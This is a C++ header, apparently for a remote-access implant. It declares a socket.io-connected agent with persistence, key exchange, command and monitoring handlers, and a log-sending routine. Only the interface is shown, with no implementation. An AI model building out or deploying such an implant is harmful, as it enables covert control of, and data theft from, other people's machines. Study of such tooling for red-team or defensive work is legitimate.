#pragma once

#include <string>
#include <thread>
#include <condition_variable>
#include <sio_client.h>
#include "Commands.h"

enum State { RUNNING, MONITORING, CONNECTED, DISCONNECTED, STOPPED };

struct Config{
	const std::string ip;
	const int port;
	State state;
};

class Implant {
public:
	Implant(Config config) : config{config} {};
	~Implant();
	void run();
private:
	Config config;

	sio::client io;

	std::mutex _lock;
	std::condition_variable_any _cond;

	void start();
	void enablePersistence();
	void addListeners();
	void keyExchange();
	void removeListeners();
	void onConnected();
	void onClose(sio::client::close_reason const& reason);
	void onFail();

	void sendResponse(json response, std::function<void(sio::message::ptr const&)> callback);
	void onCommand(sio::event&);
	void onMonitor(sio::event&);
	void sendLogs();
};